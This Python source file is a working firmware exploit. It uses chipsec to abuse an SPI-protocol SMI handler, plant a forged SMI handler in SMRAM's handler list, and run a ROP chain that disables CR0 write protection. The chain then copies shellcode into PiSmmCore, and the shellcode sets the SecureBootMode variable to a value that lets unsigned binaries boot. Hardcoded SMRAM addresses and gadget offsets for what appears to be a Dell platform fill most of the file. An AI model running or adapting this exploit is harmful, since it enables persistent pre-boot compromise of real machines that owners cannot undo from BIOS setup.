import sys
import struct
import glob
import click
from uuid import UUID
import chipsec.chipset
import chipsec.hal
from chipsec.hal.interrupts import Interrupts
from chipsec.hal import virtmem
from ctypes import *
from peachpy.x86_64 import *
rsp = peachpy.x86_64.registers.rsp

UINT8  = c_ubyte
UINT16 = c_uint16
UINT32 = c_uint32
UINT64 = c_uint64
UINTN  = UINT64

class LIST_ENTRY(LittleEndianStructure):
    LIST_ENTRY = LittleEndianStructure
    _fields_ = [("ForwardLink", UINTN),
                ("BackLink", UINTN)]
class UEFI_GUID(LittleEndianStructure):
     _fields_ = [("guid",   UINT8*16)]
     def from_bytes(self, buf):
         self.guid = (UINT8*16)(*buf)
class SMI_ENTRY(LittleEndianStructure):
    _fields_ = [("Signature",     UINTN),
                ("AllEntries",    LIST_ENTRY),
                ("HandlerType",   UEFI_GUID),
                ("SmiHandlers",   LIST_ENTRY)]

class SMI_HANDLER(LittleEndianStructure):
    _fields_ = [("Signature",     UINTN),               # 0x000
                ("Link",          LIST_ENTRY),          # 0x008
                ("Handler",       UINTN),               # 0x018
                ("CallerAddr",    UINTN),               # 0x020
                ("SmiEntry",      UINTN),               # 0x028
                ("Context",       UINTN),               # 0x030
                ("ContextSize",   UINTN),               # 0x038
                ("pFunction",     UINTN),               # 0x040
                ("ppFunction",    UINTN),               # 0x048
                ("SrcAddr",       UINTN),               # 0x050
                ("Dummy0",        UINTN)]               # 0x058

class WRITE_COMMAND_BUFFER(LittleEndianStructure):
    _pack_ = 1
    _fields_ = [("Command",              UINTN),
                ("RetVal",               UINTN),
                ("FlashRegionType",      UINT32),
                ("Address",              UINT32),
                ("ByteCount",            UINT32),
                ("Buffer",               UINTN),
                ("Dummy",                (UINT32*7))]   # Fix a bug with chipsec that uses the buffer size with the header.

smmc_loc = 0x84a50130
tseg = 0x8a000000
smi_cmd_buf_loc = 0x84a18000
controllable_address = 0x1a0000
LIST_OFFSET = 8
SmmEntryPoint = 0x8afeeeb0             # from SMM_CORE_PRIVATE_DATA
PiSmmCoreImageBase = SmmEntryPoint - 0x1eb0
DellNbEcSmmImageBase = 0x8aae7000      # From SMRAM dump
PiSmmCpuDxeSmmImageBase = 0x8ade6000   # From SMRAM dump
VariableSmmImageBase = 0x8aee0000      # From SMRAM dump

SmmVariableSetVariable = VariableSmmImageBase + 0x1b9c
memcpy_wrapper = SmmEntryPoint + 0x1a98
mSmiEntryList = SmmEntryPoint + 0xa710
next_list_entry = 0x8afeb2a0            # From SMRAM dump, used to reconnect the linked list.
    
MOV_ESP_EBX_POP_RDI_RET = PiSmmCoreImageBase + 0x32e5
STR_RBX_R11D_XOR_EAX_EAX_LDR_RBX_RSP_50_ADD_RSP_30_RET = DellNbEcSmmImageBase + 0x5186
POP_RAX_POP_RDI_RET = PiSmmCoreImageBase + 0x105a
POP_RBX_RET = PiSmmCoreImageBase + 0x1135
MOV_R8_RBX_MOV_RDX_RDI_MOV_RCX_RAX_CALL_MEMCPY  = PiSmmCoreImageBase + 0x79d7
ADD_RSP_20_POP_RDI_RET = PiSmmCoreImageBase + 0x3d35
MOV_CR0_RAX_RET = PiSmmCpuDxeSmmImageBase + 0x193f
shllcode_loc = PiSmmCoreImageBase + 0x45e4

def printq(buf, offset=0):
    for i in range(0, len(buf), 8):
         print(hex(offset + i), ': ', hex(int().from_bytes(buf[i:i+8], 'little')))

def qbytes(i):
    i = i if i > 0 else i % (1 << 64)
    return i.to_bytes(8, 'little')
zero_quad = qbytes(int(0))

def to_wchar(buf):
    wc = b''
    for c in buf:
        wc += c.to_bytes(1, 'little') + b'\x00'
    return wc

@click.command()
@click.option('--enable', '-e', is_flag=True, help='Enable SecureBoot.')
@click.option('--debug', '-d', is_flag=True, help='Print SMI_ENTRY, SMI_HANDLER, ROP and shellcode.')
def main(enable, debug):
    bytes_table_size = 0x10000
    PCH_SPI_PROTOCOL_GUID = '56521f06-0a62-4822-9963-df019d72c7e1'

    # init chipsec stuff
    cs = chipsec.chipset.cs()
    cs.init(None, None, True)
    interrupts = Interrupts( cs )
    mem = chipsec.hal.physmem.Memory(cs)
    vmem = virtmem.VirtMemory(cs)

    SmiEntry = SMI_ENTRY()
    SmiEntry_loc = controllable_address - LIST_OFFSET
    SmiHandlers_offset = addressof(SmiEntry.SmiHandlers) - addressof(SmiEntry)

    SmiHandler_loc = SmiEntry_loc + sizeof(SmiEntry)
    SmiHandler = SMI_HANDLER()
    SmiHandler.Signature = int().from_bytes(b'smih', 'little')
    SmiHandler.Link.ForwardLink = SmiEntry_loc + SmiHandlers_offset
    SmiHandler.Link.BackLink = SmiEntry_loc + SmiHandlers_offset
    SmiHandler.Handler = memcpy_wrapper
    SmiHandler.CallerAddr = 0
    SmiHandler.SmiEntry = MOV_ESP_EBX_POP_RDI_RET
    SmiHandler.Context = ADD_RSP_20_POP_RDI_RET
    SmiHandler.ContextSize = 0
    SmiHandler.pFunction = memcpy_wrapper
    SmiHandler.ppFunction = SmiHandler_loc + 0x28 # Should point to pFunction when the code is adding 0x18 to this pointer.

    SmiEntry.Signature = int().from_bytes(b'smie', 'little')
    SmiEntry.AllEntries.ForwardLink = next_list_entry
    SmiEntry.AllEntries.BackLink = mSmiEntryList
    aaaaaa = UUID("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa")
    SmiEntry.HandlerType.from_bytes(aaaaaa.bytes_le)
    SmiEntry.SmiHandlers.ForwardLink = SmiHandler_loc + LIST_OFFSET
    SmiEntry.SmiHandlers.BackLink = SmiEntry_loc + SmiHandlers_offset

    shellcode_user_loc_va, shellcode_user_loc = (0x2_0000, 0x2_0000)#vmem.alloc_virtual_mem(0x1000, 0xffffffff)

    guid = '0c573b77-eb93-4d3d-affc-5febcafb65b0'
    var_info_loc = 0x4_0000
    var_guid = UUID(guid).bytes_le
    var_guid_loc = var_info_loc
    var_name = to_wchar(b'SecureBootMode\x00')
    var_name_loc = var_guid_loc + len(var_guid)
    # Valid values are 2 and 3, 4 enables the next bit and allows boot of unsigned binaries.
    # This value can't be changed back by the bios setup, not even with loading factory defaults.
    # It can only be changed back from smm.
    var_val = b'\x04' if not enable else b'\x01'
    var_val_loc = var_name_loc + len(var_name)
    w = var_guid + var_name + var_val 
    mem.write_physical_mem(var_info_loc, len(w), w)
    SmmVariableSetVariable_ret_val_loc = 0x10000

    # Change stack location so we don't overwrite original stack location
    shell = MOV(rsp, 0x11000).encode()

    # Set arguments for SmmVariableSetVariable
    shell += MOV(rcx, var_name_loc).encode()
    shell += MOV(rdx, var_guid_loc).encode() 
    shell += MOV(r8, 0x7).encode() #NV+BS+RT
    shell += MOV(r9, len(var_val)).encode()
    shell += MOV(rax, var_val_loc).encode() 
    shell += MOV([rsp+0x20], rax).encode()

    # call SmmVariableSetVariable and srote returned value
    shell += MOV(rax, SmmVariableSetVariable).encode() 
    shell += CALL(rax).encode()
    shell += MOV(rbx, SmmVariableSetVariable_ret_val_loc).encode() 
    shell += MOV([rbx], rax).encode() 
    
    shell += MOV(rbx, SmiHandler_loc + 0x28).encode() + MOV(rsp, [rbx]).encode() + MOV(rax, (1<<63)|0x18).encode() + RET().encode()
    mem.write_physical_mem(shellcode_user_loc, len(shell), shell)

    # Save R11 (the original stack pointer) to restore execution from the shellcode. The second argument used by the second call to memcpy_wrapper.
    rop_buffer = qbytes(STR_RBX_R11D_XOR_EAX_EAX_LDR_RBX_RSP_50_ADD_RSP_30_RET) + zero_quad + qbytes(SmiHandler_loc + 0x10) + zero_quad*5 

    # Disable Write protect bit in CR0
    rop_buffer += qbytes(POP_RAX_POP_RDI_RET) + qbytes(0x80000033) + zero_quad
    rop_buffer += qbytes(MOV_CR0_RAX_RET)

    # Copy shellcode to code segment of PiSmmCore.
    rop_buffer += qbytes(POP_RBX_RET) + qbytes(len(shell))
    rop_buffer += qbytes(POP_RAX_POP_RDI_RET) + qbytes(shllcode_loc) + qbytes(shellcode_user_loc)
    rop_buffer += qbytes(MOV_R8_RBX_MOV_RDX_RDI_MOV_RCX_RAX_CALL_MEMCPY) + zero_quad * 5

    #return to shellcode.
    rop_buffer += qbytes(shllcode_loc)

    SmiBuf = bytes(SmiEntry) + bytes(SmiHandler)
    mem.write_physical_mem(SmiEntry_loc, len(SmiBuf), SmiBuf)
    mem.write_physical_mem(SmiHandler_loc + 0x60, len(rop_buffer), rop_buffer)
    if debug:
        data = mem.read_physical_mem(SmiEntry_loc, 0x200)
        printq(data, SmiEntry_loc)

    # Read flash bytes for bytes table: 
    dest_loc_va, dest_loc = vmem.alloc_virtual_mem(bytes_table_size, 0xffffffff)
    mem.write_physical_mem(dest_loc, bytes_table_size, b'\xaa'*bytes_table_size)
    wcb = WRITE_COMMAND_BUFFER()
    wcb.Command = 1
    wcb.RetVal = 0
    wcb.FlashRegionType = 1
    wcb.Address = 0
    wcb.ByteCount = bytes_table_size
    wcb.Buffer = dest_loc
    click.secho('[=] Reading flash block to local bytes_table', fg='yellow')
    ReturnStatus = interrupts.send_smmc_SMI(smmc_loc, PCH_SPI_PROTOCOL_GUID, bytes(wcb), smi_cmd_buf_loc)
    bytes_table = mem.read_physical_mem(dest_loc, bytes_table_size)
    controllable_address_flash_offset = bytes_table.find(controllable_address.to_bytes(4, 'little'))
    if controllable_address_flash_offset < 0:
        click.secho("[-] Can't find offset for controllable_address", fg='red')
        sys.exit()
    
    # Install handler
    click.secho('[=] Setting original first SMI handler to point to our handler (overwrite NextEntryList back pointer)', fg='yellow')
    wcb.Address = controllable_address_flash_offset
    wcb.ByteCount = 4
    wcb.Buffer = next_list_entry + LIST_OFFSET
    ReturnStatus = interrupts.send_smmc_SMI(smmc_loc, PCH_SPI_PROTOCOL_GUID, bytes(wcb), smi_cmd_buf_loc)
    click.secho('[=] Setting our handler as the first in the linked list. (overwrite PiSmmCore:mSmiEntryList)', fg='yellow')
    wcb.Buffer = mSmiEntryList
    ReturnStatus = interrupts.send_smmc_SMI(smmc_loc, PCH_SPI_PROTOCOL_GUID, bytes(wcb), smi_cmd_buf_loc)
    ReturnStatus = interrupts.send_smmc_SMI(smmc_loc, PCH_SPI_PROTOCOL_GUID, bytes(wcb), smi_cmd_buf_loc)
    click.secho(f'[=] testing PCH_SPI_PROTOCOL after overwrite (did we break anything?) {ReturnStatus:x}', fg='yellow')

    click.secho('[=] Executing SMM handler->ROP->shellcode', fg='yellow')
    ReturnStatus = interrupts.send_smmc_SMI(smmc_loc, str(aaaaaa), b'', smi_cmd_buf_loc)
    
    # Read SmmVariableSetVariable return value.
    data = mem.read_physical_mem(SmmVariableSetVariable_ret_val_loc, 0x8)
    ret = int().from_bytes(data, 'little')
    if ret == 0:
        click.secho(f'[+] Success, Secureboot {"enabled" if enable else "disabled"}', fg='green')
    else:
        click.secho(f'[-] Error: {ret:08x}', fg='red')

if __name__ == '__main__':
    main()
